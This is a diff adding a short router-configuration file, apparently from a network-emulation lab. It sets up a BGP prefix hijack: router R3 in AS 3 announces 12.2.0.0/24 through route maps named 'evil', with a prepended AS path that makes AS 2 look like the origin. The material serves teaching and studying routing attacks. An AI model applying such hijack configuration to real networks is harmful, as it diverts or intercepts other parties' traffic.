@@ -1,0 +1,25 @@
+./connect-zebra.sh R3
+
+configure terminal
+ip route 12.2.0.0/24 6.0.0.1
+exit
+
+--------------------------------------------------------------------------------
+./connect-bgp.sh R3
+
+configure terminal
+!
+ip prefix-list evil-prefix-list-12-2 permit 12.2.0.0/24
+!
+route-map evil-route-map-12-2 permit 10
+   match ip address prefix-list evil-prefix-list-12-2
+   set as-path prepend 2
+route-map evil-route-map-12-2 permit 20
+   exit
+!
+router bgp 3
+  network 12.2.0.0/24
+  neighbor 6.0.0.1 route-map evil-route-map-12-2 out
+  exit
+exit
+
